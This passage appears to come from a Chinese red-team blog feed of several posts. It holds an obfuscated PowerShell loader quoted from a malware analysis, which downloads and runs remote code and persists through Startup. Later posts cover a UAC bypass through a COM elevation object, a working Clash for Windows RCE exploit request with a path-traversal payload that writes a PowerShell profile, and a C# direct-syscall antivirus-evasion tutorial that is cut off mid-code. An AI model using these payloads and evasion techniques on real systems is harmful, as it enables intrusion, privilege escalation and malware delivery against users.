“c:\windows\system32\windowspowershell\v1.0\powershell.exe” -ep bypass -c (i’w’r(‘hxxps://powpowpowff.blogspot[.]com/atom.xml’) -useb) | .(‘{1}{0}’-f’ex’,’i’) | ping 127.0.0.1        -&gt; 将&quot;C:\\ProgramData\\MinMinons\&quot; 下所有文件复制到开机自启路径(Startup)        -&gt;删除C:\ProgramData\MinMinons\Candlegraphy.~___~        -&gt;删除C:\ProgramData\MinMinons\*.vbs        -&gt;删除C:\ProgramData\MinMinons\*.exe</code></pre><p>解密完这些混淆一共得到11个文件：<br><img src="https://i.miji.bid/2023/08/07/175cdd87acc81086917494a53043b979.png" alt=""></p><p>powershell主要关注的</p><pre><code>Function Bulega {    param($Bulegagone)    $Bulegagone =  -join ($Bulegagone -split &#39;(..)&#39; | ? { $_ } | % { [char][convert]::ToUInt32($_,16) })    return $Bulegagone}遍历混淆的十六进制编码进行解码.(&#39;{x}{9}&#39;.replace(&#39;9&#39;,&#39;0&#39;).replace(&#39;x&#39;,&#39;1&#39;)-f&#39;gomaliker&#39;,&#39;%%&#39;).replace(&#39;%%&#39;,&#39;I&#39;).replace(&#39;gomaliker&#39;,&#39;EX&#39;)IEX</code></pre>]]></content>
      
      
        <tags>
            
            <tag> 恶意分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>关于COM口{A6BFEA43-501F-456F-A845-983D3AD7B8F0} BypassUAC研究</title>
      <link href="/posts/bf1048f6.html"/>
      <url>/posts/bf1048f6.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天上线的机器，通过用DLL劫持和注册表进行BypassUac发现很不行。win10下的360可能不杀可能杀，注册表通过修改ShellCommand来实现ByPassUAC的操作。过于敏感，而DLL劫持BypassUAC用久后又会被杀。今天翻文章看到头像哥的COM口bypassuac。发现可行，稍微研究了一下</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.zcgonvh.com/post/Advanced_Windows_Task_Scheduler_Playbook-Part.2_from_COM_to_UAC_bypass_and_get_SYSTEM_dirtectly.html" target="_blank" rel="noopener">https://www.zcgonvh.com/post/Advanced_Windows_Task_Scheduler_Playbook-Part.2_from_COM_to_UAC_bypass_and_get_SYSTEM_dirtectly.html</a><br><a href="https://3gstudent.github.io/backup-3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-Windows%E4%B8%8B%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E7%9A%84%E4%BD%BF%E7%94%A8/" target="_blank" rel="noopener">https://3gstudent.github.io/backup-3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-Windows%E4%B8%8B%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E7%9A%84%E4%BD%BF%E7%94%A8/</a><br><a href="https://3gstudent.github.io/%E9%80%9A%E8%BF%87COM%E7%BB%84%E4%BB%B6NetFwPolicy2%E8%B6%8A%E6%9D%83%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99" target="_blank" rel="noopener">https://3gstudent.github.io/%E9%80%9A%E8%BF%87COM%E7%BB%84%E4%BB%B6NetFwPolicy2%E8%B6%8A%E6%9D%83%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99</a><br><a href="https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-dllgetclassobject" target="_blank" rel="noopener">https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-dllgetclassobject</a><br><a href="http://www.cppblog.com/Streamlet/archive/2012/09/07/189762.html" target="_blank" rel="noopener">http://www.cppblog.com/Streamlet/archive/2012/09/07/189762.html</a></p><p>Github Link:<a href="https://github.com/zcgonvh/TaskSchedulerMisc/blob/master/schuac.cs" target="_blank" rel="noopener">https://github.com/zcgonvh/TaskSchedulerMisc/blob/master/schuac.cs</a></p><h2 id="模仿复刻"><a href="#模仿复刻" class="headerlink" title="模仿复刻"></a>模仿复刻</h2><p>COM Elevation Moniker的使用对COM组件有如下要求<br>该COM组件被注册<br>注册位置在HKEY_LOCAL_MACHINE下，也就是说，需要以管理员权限注册这个COM组件才可以<br>注册表HKEY_LOCAL_MACHINE\Software\Classes\CLSID下需要指定三项键值{CLSID}, LocalizedString(REG_EXPAND_SZ):displayName<br>{CLSID}/Elevation,IconReference(REG_EXPAND_SZ):applicationIcon<br>{CLSID}/Elevation,Enabled(REG_DWORD):1</p><p><img src="https://i.mji.rip/2023/07/20/2f8f90f89e145a96410d6da02f8440d4.png" alt=""></p><p>Elevation项 - Enabled判断是否启用<br>InProcServer32 - 一个 32 位进程内服务器并指定服务器可以运行的单元的线程模型<br>VirtualServerObjects - 辅助对象(在微软的文档里，我没找到描述这个的内容)-&gt;我理解为COM口CLSID有这个项的，理解为子COM口<br>ProgID - 系统服务名称<br>Programmable - 可编程的<br>TypeLib -<br>Version - 版本</p><p>通过查询：{A6BFEA43-501F-456F-A845-983D3AD7B8F0}可以得到如下</p><pre><code>PS C:\Users\Lenovo&gt; reg query &quot;HKEY_CLASSES_ROOT\CLSID\{A6BFEA43-501F-456F-A845-983D3AD7B8F0}&quot;HKEY_CLASSES_ROOT\CLSID\{A6BFEA43-501F-456F-A845-983D3AD7B8F0}    (默认)    REG_SZ    Virtual Factory for MaintenanceUI    AppId    REG_SZ    {A6BFEA43-501F-456F-A845-983D3AD7B8F0}    LocalizedString    REG_EXPAND_SZ    @%SystemRoot%\System32\MaintenanceUI.dll,-1HKEY_CLASSES_ROOT\CLSID\{A6BFEA43-501F-456F-A845-983D3AD7B8F0}\ElevationHKEY_CLASSES_ROOT\CLSID\{A6BFEA43-501F-456F-A845-983D3AD7B8F0}\InProcServer32HKEY_CLASSES_ROOT\CLSID\{A6BFEA43-501F-456F-A845-983D3AD7B8F0}\VirtualServerObjectsPS C:\Users\Lenovo&gt; reg query &quot;HKEY_CLASSES_ROOT\CLSID\{A6BFEA43-501F-456F-A845-983D3AD7B8F0}\VirtualServerObjects&quot;HKEY_CLASSES_ROOT\CLSID\{A6BFEA43-501F-456F-A845-983D3AD7B8F0}\VirtualServerObjects    {0f87369f-a4e5-4cfc-bd3e-73e6154572dd}    REG_SZPS C:\Users\Lenovo&gt; reg query &quot;HKEY_CLASSES_ROOT\CLSID\{A6BFEA43-501F-456F-A845-983D3AD7B8F0}\Elevation&quot;HKEY_CLASSES_ROOT\CLSID\{A6BFEA43-501F-456F-A845-983D3AD7B8F0}\Elevation    Enabled    REG_DWORD    0x1</code></pre><p>此时我们可以得到的信息有</p><pre><code>COM Name:Virtual Factory for MaintenanceUICOM GUID:{A6BFEA43-501F-456F-A845-983D3AD7B8F0}处理该COM的文件:@%SystemRoot%\System32\MaintenanceUI.dll子COM口:{0f87369f-a4e5-4cfc-bd3e-73e6154572dd}COM口是否启用:0x1</code></pre><p>此时我们要研究的COM口的SID是：{0f87369f-a4e5-4cfc-bd3e-73e6154572dd}，通过注册表查询并没有见到Elevation，意味着我们不能直接调用这个COM口<br><img src="https://i.mji.rip/2023/07/20/d1cfe236b65fd97466cf8ae38bbd3560.png" alt=""></p><p>powershell连接如下</p><pre><code>$obj =[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;A6BFEA43-501F-456F-A845-983D3AD7B8F0&quot;))$obj | get-member</code></pre><p><img src="https://i.mji.rip/2023/07/20/4fdac4737b3d74de8e90a9f563e88390.png" alt=""></p><p>而A6BFEA43-501F-456F-A845-983D3AD7B8F0<br><img src="https://i.mji.rip/2023/07/20/16f16207d2d8bbdafb20612351df42e3.png" alt=""></p><p>根据头像哥的文章进行复现<br><img src="https://i.mji.rip/2023/07/20/34a8ca57288ee45dede9a9ed28557506.png" alt=""><br><a href="https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-dllgetclassobject" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-dllgetclassobject</a></p><p><img src="https://i.mji.rip/2023/07/20/af635fb22c981ac15e973d9484b14701.png" alt=""></p><blockquote><blockquote><p>调用operator new分配足够的空间，并调用相关对象的构造函数<br>调用CClassFactory工厂类<br><img src="https://i.mji.rip/2023/07/20/89c0f2cb29945caba36275b581155eea.png" alt=""></p></blockquote></blockquote><p>大概是<classname>::CreateInstance<br><img src="https://i.mji.rip/2023/07/20/1b21f45d8ae299a5fc3a8a5a72c7ca37.png" alt=""></classname></p><p>CClassFactory::CreateInstance</p><blockquote><blockquote><p>上面的两个if判断相加后是否等于对应的GUID<br>如果两个都不是则去到30行</p><pre><code>*a4 = 0i64;  v4 = (const struct _GUID *)((char *)this + 8);  v5 = a4;  v6 = a3;  if ( *(_OWORD *)((char *)this + 8) == *(_OWORD *)&amp;CLSID_MultiObjectElevationFactory ) //-&gt; CLSID:36F0BD14-0D84D-468C-0B79C99900F30FA897F  {    if ( WPP_GLOBAL_Control != &amp;WPP_GLOBAL_Control &amp;&amp; *((_BYTE *)WPP_GLOBAL_Control + 28) &amp; 8 )      WPP_SF_(*((_QWORD *)WPP_GLOBAL_Control + 2), 12i64, &amp;WPP_8681af7930fc3f9ff14ce17035134427_Traceguids);    v7 = CElevatedFactoryClient::CreateInstance(v6, v5);LABEL_16:    v9 = v7;    goto LABEL_21;  }  if ( *(_OWORD *)((char *)this + 8) == *(_OWORD *)&amp;CLSID_ElevatedFactoryServerManager ) -&gt; CLSID:0E755468C-2F5-4D96-84873B0E68F0FE633A  {    if ( WPP_GLOBAL_Control != &amp;WPP_GLOBAL_Control &amp;&amp; *((_BYTE *)WPP_GLOBAL_Control + 28) &amp; 8 )      WPP_SF_(*((_QWORD *)WPP_GLOBAL_Control + 2), 13i64, &amp;WPP_8681af7930fc3f9ff14ce17035134427_Traceguids);    v7 = CElevatedFactoryServerManager::GetSingleton(v6, v5);    goto LABEL_16;  }</code></pre><p><img src="https://i.mji.rip/2023/07/20/191d26674f75d5c0b6bf69beab429e62.png" alt=""></p></blockquote></blockquote><pre><code> v8 = _IsValidVirtualFactory(v4);  v9 = v8;  if ( !v8 )  {    if ( WPP_GLOBAL_Control != &amp;WPP_GLOBAL_Control &amp;&amp; *((_BYTE *)WPP_GLOBAL_Control + 28) &amp; 8 )      WPP_SF_(*((_QWORD *)WPP_GLOBAL_Control + 2), 14i64, &amp;WPP_8681af7930fc3f9ff14ce17035134427_Traceguids);    v7 = CElevatedFactoryServer::CreateInstance(v4, v6, v5);    goto LABEL_16;  }</code></pre><p>CElevatedFactoryServer::CreateInstance<br>返回CElevatedFactoryServer实例<br><img src="https://i.mji.rip/2023/07/20/7985dedcdce8a1622f98caeace052363.png" alt=""></p><p>通过查看发现只有一个接口<br><img src="https://i.mji.rip/2023/07/20/be79ea64bcbe53da78f6ac9e19a74452.png" alt=""></p><p><img src="https://i.mji.rip/2023/07/20/f326d67fa1d6b93fe63b8a15d4a0a60b.png" alt=""><br><img src="https://i.mji.rip/2023/07/20/158c842f4afa343a5481543fb375ae9e.png" alt=""></p><p>创建并默认初始化与指定 CLSID 关联的类的单个对象。当您只想在本地系统上创建一个对象时，请调用CoCreateInstance 。要在远程系统上创建单个对象，请调用CoCreateInstanceEx函数。要基于单个 CLSID 创建多个对象，请调用CoGetClassObject函数。</p><pre><code>HRESULT CoCreateInstance(  [in]  REFCLSID  rclsid,  [in]  LPUNKNOWN pUnkOuter,  [in]  DWORD     dwClsContext,  [in]  REFIID    riid,  [out] LPVOID    *ppv);</code></pre><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance" target="_blank" rel="noopener">https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance</a></p><p>获取接口类对应的CLSID<br><img src="https://i.mji.rip/2023/07/20/5b4d53e013902bd5cb53837a119d52bc.png" alt=""></p><p>（每个接口类都有一个CLSID）<br><img src="https://i.mji.rip/2023/07/20/048d494642d0e09cb9e6dc15d61adfda.png" alt=""></p><p>回到开头判断CLSID那个地方跟踪上一个CLSID即可发现（赌- -）<br><img src="https://i.mji.rip/2023/07/20/274f84dc1645c3195de180b42b39a571.png" alt=""><br><img src="https://i.mji.rip/2023/07/20/55f8cec44b7402200163657ba11b169e.png" alt=""></p><p>正确寻找该CLSID的方法应该是定位到对应工厂类的QueryInterface函数调用该变量<br><img src="https://i.mji.rip/2023/07/20/68f991519dd65197b1a3cd6eaab79c7d.png" alt=""><br><img src="https://i.mji.rip/2023/07/20/7772186f5055cb4b3d1d4c375bd5cc00.png" alt=""></p><p>至此结论是：<br>由于CElevatedFactoryServer::ServerCreateElevatedObject首个参数可控，<strong>利用该参数可以创建任意注册路径表带有VirtualServerObjects项的CLSD对象</strong>。<br><img src="https://i.mji.rip/2023/07/20/4e68acbe7963870ed28574892364c6f9.png" alt=""></p><p>然后选择能利用的COM口，这里的0f87369f-a4e5-4cfc-bd3e-73e6154572dd就是用来操控计划任务的。然后只需要找到对应调用的接口类，声明对应的接口类并调用其中类的里的某个函数。<br>例如代码里的：ITaskService<br><img src="https://i.mji.rip/2023/07/20/35a2775fc88b595ab0f5960cd7ab2e3c.png" alt=""><br><img src="https://i.mji.rip/2023/07/20/cbfc21344f4f876c979a355c86b480ba.png" alt=""></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>其他知识点（抄自头像哥）</p><pre><code>我们知道经过UAC提升的COM对象需要使用`CoGetObject`函数，结合`Elevation Moniker`进行激活，这个行为记录在https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker。参考文章代码，我们注意到在微软的示例中采用`CLSCTX_LOCAL_SERVER`作为激活上下文标记，这表示要求DCOMLaunch创建一个新的进程外COM对象，`A6BFEA43-501F-456F-A845-983D3AD7B8F0`对象仅配置了`InProcServer32`，这将导致`代理激活（Surrogate Activation）`。关于代理激活有两个重要的点：首先从安全研究角度，配置了`APPID`的代理激活往往存在自定义权限检查。参考文档https://docs.microsoft.com/en-us/windows/win32/com/launchpermission与https://docs.microsoft.com/en-us/windows/win32/com/accesspermission，默认隐式权限检查由注册表项`HKEY_LOCAL_MACHINE\SOFTWARE\Classes\AppID\{APPID}@LaunchPermission`、`HKEY_LOCAL_MACHINE\SOFTWARE\Classes\AppID\{APPID}@AccessPermission`共同决定，其值为二进制格式表示的安全描述符`Security Descriptor(SD) binary form`。</code></pre><p><img src="https://i.mji.rip/2023/07/20/09c3c7b0820f8e63d91807dec6848145.png" alt=""></p><pre><code>$x=get-itemproperty &#39;hklm:\software\classes\appid\{A6BFEA43-501F-456F-A845-983D3AD7B8F0}&#39;(new-object System.Security.AccessControl.RawSecurityDescriptor($x.LaunchPermission,0)).DiscretionaryAcl|fl(new-object System.Security.AccessControl.RawSecurityDescriptor($x.AccessPermission,0)).DiscretionaryAcl|fl</code></pre><p><img src="https://i.mji.rip/2023/07/20/9dbb2dd4577795e5eae1f48c56b4c670.png" alt=""></p><p>注意：该CLSID win7以上才有(Windows Server 2012开始有)</p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>clash文件覆写导致RCE</title>
      <link href="/posts/d0a451b7.html"/>
      <url>/posts/d0a451b7.html</url>
      <content type="html"><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>影响版本：&lt;=0.19.8<br>复现环境：<br>windows+clash for windows+内核clash-windows-amd64-v1.15.0+未设置secret    </p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>默认先走授权，有secret无法利用<br>（2021年后默认随机UUID的secret，端口随机）<br><img src="https://s1.ax1x.com/2023/06/21/pCGekqS.png" alt=""><br><img src="https://s1.ax1x.com/2023/06/21/pCGeZ5j.png" alt=""></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>API请求包    </p><pre><code>PUT /configs?force=true HTTP/1.1Host: 127.0.0.1:9090Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 326{&quot;payload&quot;:&quot;mixed-port: 7890\nallow-lan: false\nmode: rule\nlog-level: warning\nproxy-providers:\n  provider1:\n    type: http\n    url: &#39;http://127.0.0.1:9999/evil.yaml&#39;\n    interval: 3600\n    path: ../../.zshenv\n    healthcheck:\n      enable: true\n      interval: 600\n      url: http://www.gstatic.com/generate_204&quot;}</code></pre><p>windows下的payload<br>vps开http.server<br>evil.yaml   </p><pre><code>calc.exe &amp;&amp; echo :proxies:  - {name: vP, server: n04.a00x.party, port: 18000, type: ssr, cipher: aes-256-cfb, password: AFX92CS, protocol: auth_aes128_sha1, obfs: http_simple, protocol-param: 232991:xSnSFv, obfs-param: download.windowsupdate.com, udp: true}#&gt;</code></pre><p>通过利用powershell自定义.profile来执行命令。当用户打开powershell将触发<br>（还需要powershell运行脚本执行才能成功）    </p><pre><code>1、%windir%\system32\WindowsPowerShell\v1.0\profile.ps1它作用于所有用户、所有的Shell。2、%windir%\system32\WindowsPowerShell\v1.0\ Microsoft.PowerShell_profile.ps1作用于所有用户，但只作用于Microsoft.PowerShell这个shell。这个我也没懂是什么意思，难道还有不是PowerShell的PowerShell shell？呃，有点像绕口令。3、%UserProfile%\My Documents\WindowsPowerShell\profile.ps1作用于当前用户的所有shell。4、%UserProfile%\My Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1作用于当前用户的Microsoft.PowerShell这个shell。</code></pre><p><img src="https://files.catbox.moe/t6x1gl.gif" alt=""></p><p>开机自启路径<br>（有杀毒纯纯白给）<br><img src="https://s1.ax1x.com/2023/06/21/pCGmCFJ.png" alt=""></p><h2 id="代码跟踪"><a href="#代码跟踪" class="headerlink" title="代码跟踪"></a>代码跟踪</h2><p>可以看到updateConfigs函数处理，只要json格式正确直接进行下一步<br><img src="https://s1.ax1x.com/2023/06/21/pCGmakQ.png" alt=""></p><p>最后解析json里的payload。获取路径，拼接路径，根据类型进行处理。最后调用NewProxySetProvider函数<br><img src="https://s1.ax1x.com/2023/06/21/pCGmwfs.png" alt=""></p><p><img src="https://s1.ax1x.com/2023/06/21/pCGmr60.png" alt=""><br><a href="https://github.com/Dreamacro/clash/blob/4d66da2277ddaf41f83bd889b064c0a584f7a8ad/adapter/provider/parser.go#L4" target="_blank" rel="noopener">https://github.com/Dreamacro/clash/blob/4d66da2277ddaf41f83bd889b064c0a584f7a8ad/adapter/provider/parser.go#L4</a>     </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>作者最早添加更新配置文件的API都加了安全验证<a href="https://github.com/Dreamacro/clash/commit/9cfd26d44062c8d0811395cf944024bb680705b5" target="_blank" rel="noopener">https://github.com/Dreamacro/clash/commit/9cfd26d44062c8d0811395cf944024bb680705b5</a><br>能被利用纯属自己不设置secret<br><a href="https://github.com/Dreamacro/clash/blob/9cfd26d44062c8d0811395cf944024bb680705b5/hub/route/server.go" target="_blank" rel="noopener">https://github.com/Dreamacro/clash/blob/9cfd26d44062c8d0811395cf944024bb680705b5/hub/route/server.go</a><br><img src="https://s1.ax1x.com/2023/06/21/pCGmfh9.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://0xf4n9x.github.io/2022/10/20/clash-unauth-force-configs-csrf-rce/" target="_blank" rel="noopener">https://0xf4n9x.github.io/2022/10/20/clash-unauth-force-configs-csrf-rce/</a></p>]]></content>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>C# syscall免杀</title>
      <link href="/posts/78d2031e.html"/>
      <url>/posts/78d2031e.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近打了两个项目，大多数笔记都更新在星球了。想起来，很久没写博客了，更新一下<br>最近研究了一下C#的syscall，记录一下<br><img src="https://s1.ax1x.com/2022/11/22/zlo3od.png" alt=""></p><h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><blockquote><p>抄来的介绍</p></blockquote><p>在Windows中，进程架构分为两种处理器访问模式——用户模式和内核模式。这些模式的实现背后的想法是保护用户应用程序不访问和修改任何关键的操作系统数据。Chrome、Word 等用户应用程序都运行在用户模式下，而操作系统代码（如系统服务和设备驱动程序）都运行在内核模式下。<br><img src="https://s1.ax1x.com/2022/11/22/zloJJI.png" alt=""></p><p>内核模式特指处理器中的一种执行模式，它授予对所有系统内存和所有 CPU 指令的访问权限。一些 x86 和 x64处理器通过使用另一个称为环级别的术语来区分这些模式。利用环级别特权模式的处理器定义了四个特权级别 - 其他称为环- 以保护系统代码和数据。这些振铃级别的示例如下所示。<br><img src="https://s1.ax1x.com/2022/11/22/zloNSP.png" alt=""></p><p>在 Windows 中，Windows 仅使用其中两个环 - 内核模式的环 0 和用户模式的环 3。现在，在正常的处理器操作期间，处理器将根据处理器上运行的代码类型在这两种模式之间切换。那么，这种“环级”安全性背后的原因是什么？那么，当您启动用户模式应用程序时，Windows 将为该应用程序创建一个新进程，并为该应用程序提供一个私有虚拟地址空间和一个私有句柄表。 这个“句柄表”是一个包含句柄的内核对象。句柄只是对特定系统资源的抽象引用值，例如内存区域或位置、打开的文件或管道。它的最初目标是对 API 用户隐藏真实的内存地址，从而允许系统执行某些管理功能，例如重组物理内存。 总体而言，handles 作业是针对任务内部结构的，例如：令牌、进程、线程等。下面可以看到一个句柄的示例。<br><img src="https://s1.ax1x.com/2022/11/22/zloUQf.png" alt=""></p><p>因为应用程序的虚拟地址空间是私有的，所以一个应用程序不能更改属于另一个应用程序的数据——除非进程通过文件映射或通过VirtualProtect函数将其私有地址空间的一部分作为共享内存部分提供，或者除非一个进程有权打开另一个进程以使用跨进程内存功能，例如<strong>ReadProcessMemory</strong>和<strong>WriteProcessMemory</strong>。<br><img src="https://s1.ax1x.com/2022/11/22/zloay8.png" alt=""></p><p>现在，与用户模式不同，在内核模式下运行的所有代码共享一个称为系统空间的虚拟地址空间。这意味着内核模式驱动程序不与其他驱动程序和操作系统本身隔离。因此，如果驱动程序不小心写入了错误的地址空间或进行了恶意操作，那么它可能会危及系统或其他驱动程序。尽管有一些保护措施可以防止操作系统受到干扰——比如内核补丁保护又名补丁保护，但我们不必担心这些。【由于内核容纳了操作系统的大部分内部数据结构（例如句柄表），任何时候用户模式应用程序需要访问这些数据结构或需要调用内部 Windows 例程来执行特权操作（例如读取一个文件），那么它必须首先<strong>从用户模式切换到内核模式。这就是系统调用发挥作用的地方</strong>。 为了让用户应用程序在内核模式下访问这些数据结构，该进程使用了一个特殊的处理器指令触发器，称为“系统调用”。该指令触发处理器访问模式之间的转换，并允许处理器访问内核中的系统服务调度代码。】这反过来调用Ntoskrnl.exe或Win32k.sys中的适当内部函数，这些函数包含内核和 OS 应用程序级逻辑。</p><p>问题：<br>1.不同的系统的syscall不一样，怎么样才能实现在不同系统里面动态调用</p><h2 id="如何获取syscall的系统调用号"><a href="#如何获取syscall的系统调用号" class="headerlink" title="如何获取syscall的系统调用号"></a>如何获取syscall的系统调用号</h2><p>准备工具：windbg<br>获取API地址</p><pre><code>x ntdll!NtCreateFile</code></pre><p>指定地址查看反汇编</p><pre><code>u 00007ffd`3826db50</code></pre><p><img src="https://s1.ax1x.com/2022/11/22/zlo0eg.png" alt=""></p><p>得到的汇编</p><pre><code>ntdll!ZwCreateFile:00007ffd`3826db50 4c8bd1          mov     r10,rcx00007ffd`3826db53 b855000000      mov     eax,55h00007ffd`3826db58 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],100007ffd`3826db60 7503            jne     ntdll!ZwCreateFile+0x15 (00007ffd`3826db65)00007ffd`3826db62 0f05            syscall00007ffd`3826db64 c3              ret00007ffd`3826db65 cd2e            int     2Eh00007ffd`3826db67 c3              ret</code></pre><p>其中这里的<strong>mov eax,55h</strong>就是系统调用号，这里的NtCreateFile的系统调用号就是<strong>0x55</strong>。将系统调用号传入eax寄存器，将调用系统调用指令。CPU 将在此处跳转到内核模式并执行指定的特权操作。<br>这里可以看到关键的汇编指令：<br>(参数会传到r10，r10在传给rcx)</p><pre><code>mov r10,rcx //规定mov eax,&lt;系统调用号&gt;syscallret</code></pre><p>获取API函数需要的内存权限</p><pre><code>!address 00007ffd`3826db50</code></pre><p><img src="https://s1.ax1x.com/2022/11/22/zloBwQ.png" alt=""></p><h2 id="C-下如何编写"><a href="#C-下如何编写" class="headerlink" title="C#下如何编写"></a>C#下如何编写</h2><p>代码示例来源：<a href="https://github.com/SolomonSklash/SyscallPOC/tree/master/Syscall" target="_blank" rel="noopener">https://github.com/SolomonSklash/SyscallPOC/tree/master/Syscall</a></p><p>整体代码思路：<br>-&gt;先把提取出来的系统编号那段汇编放到byte[]数组<br>-&gt;定义一个函数实现委托<br>-&gt;定义byte指针，将汇编的byte[]数组赋予该指针<br>-&gt;定义名为memoryAddress的int变量，将byte指针赋予<br>-&gt;利用VirtualProtectEx修改内存权限<br>-&gt;利用Marshal.GetDelegateForFunctionPointer将函数转换为一个委托<br>-&gt;返回该委托</p><p>问题：<br>为什么要用unsafe<br>为什么要用Marshal.GetDelegateForFunctionPointer<br>为什么有UnmanagedFunctionPointer(CallingConvention.StdCall)</p><p>为什么要用unsafe</p><pre><code>当一个代码块使用 unsafe 修饰符标记时，C# 允许在函数中使用指针变量。不安全代码或非托管代码是指使用了指针变量的代码块</code></pre><p>为什么要有Marshal.GetDelegateForFunctionPointer</p><pre><code>在.net 2.0 中，框架直接提供了 Marshal.GetDelegateForFunctionPointer 来转换一个函数指针为一个委托C# 中的委托（Delegate）类似于 C 或 C++ 中函数的指针。委托（Delegate） 是存有对某个方法的引用的一种引用类型变量。引用可在运行时被改变。委托（Delegate）特别用于实现事件和回调方法。所有的委托（Delegate）都派生自 System.Delegate 类。参考链接：https://cloud.tencent.com/developer/article/1798625https://www.runoob.com/csharp/csharp-delegate.html</code></pre><p>为什么有UnmanagedFunctionPointer(CallingConvention.StdCall)</p><pre><code>UnmanagedFunctionPointer控制作为非托管函数指针传递给非托管代码或从非托管代码传递的委托签名的封送处理行为。这个类不能被继承。https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.unmanagedfunctionpointerattribute.-ctor?view=net-6.0#system-runtime-interopservices-unmanagedfunctionpointerattribute-ctor(system-runtime-interopservices-callingconvention)CallingConvention.StdCal 被调用者清理堆栈。属于调用约定枚举里面的参数https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.callingconvention?view=net-6.0</code></pre><p><strong>写死的syscall示例代码1</strong></p><pre><code class="csharp">static byte[] bNtWaitForSingleObject =        {            0x4c, 0x8b, 0xd1,               // mov r10,rcx            0xb8, 0x04, 0x00, 0x00, 0x00,   // mov eax,4            0x0F, 0x05,                     // syscall            0xC3                            // ret        };        public static NTSTATUS NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout)        {            // set byte array of bNtWaitForSingleObject to new byte array called syscall            byte[] syscall = bNtWaitForSingleObject;            // specify unsafe context            unsafe            {                // create new byte pointer and set value to our syscall byte array                fixed (byte* ptr = syscall)                {                    // cast the byte array pointer into a C# IntPtr called memoryAddress                    IntPtr memoryAddress = (IntPtr)ptr;                    // Change memory access to RX for our assembly code                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE, out uint oldprotect))                        {                        throw new Win32Exception();                    }                    // Get delegate for NtWaitForSingleObject                    Delegates.NtWaitForSingleObject assembledFunction = (Delegates.NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtWaitForSingleObject));                    return (NTSTATUS)assembledFunction(Object, Alertable, Timeout);                }            }        }public struct Delegates        {                    &lt;省略&gt;            [UnmanagedFunctionPointer(CallingConvention.StdCall)]            public delegate NTSTATUS NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout);</code></pre><p><strong>示例代码2</strong></p><pre><code class="csharp">using System;using System.ComponentModel;using System.Diagnostics;using System.Runtime.InteropServices;using static Syscall.Native;namespace Syscall{    class Syscalls    {        /*        MSDN:        NTSTATUS NtAllocateVirtualMemory(            HANDLE ProcessHandle,         // C#: IntPtr            PVOID* BaseAddress,           // C#: IntPtr            ULONG_PTR ZeroBits,           // C#: IntPtr            PSIZE_T RegionSize,           // C#: ref UIntPtr            ULONG AllocationType,         // C#: UInt32            ULONG Protect                 // C#: UInt32            );        ReactOS:        NTSTATUS NtAllocateVirtualMemory(            _In_ HANDLE ProcessHandle,            _Inout_ _Outptr_result_buffer_(* RegionSize) PVOID *BaseAddress,            _In_ ULONG_PTR ZeroBits,            _Inout_ PSIZE_T RegionSize,            _In_ ULONG AllocationType,            _In_ ULONG Protect            ); */        /*   0x18 in all Windows 10 version so far   */        static byte[] bNtAllocateVirtualMemory =        {            0x4c, 0x8b, 0xd1,               // mov r10,rcx            0xb8, 0x18, 0x00, 0x00, 0x00,   // mov eax,18h            0x0F, 0x05,                     // syscall            0xC3                            // ret        };        public static NTSTATUS NtAllocateVirtualMemory(            IntPtr ProcessHandle,            ref IntPtr BaseAddress,            IntPtr ZeroBits,            ref UIntPtr RegionSize,            uint AllocationType,            uint Protect )        {            // set byte array of bNtAllocateVirtualMemory to new byte array called syscall            byte[] syscall = bNtAllocateVirtualMemory;            // specify unsafe context            unsafe            {                // create new byte pointer and set 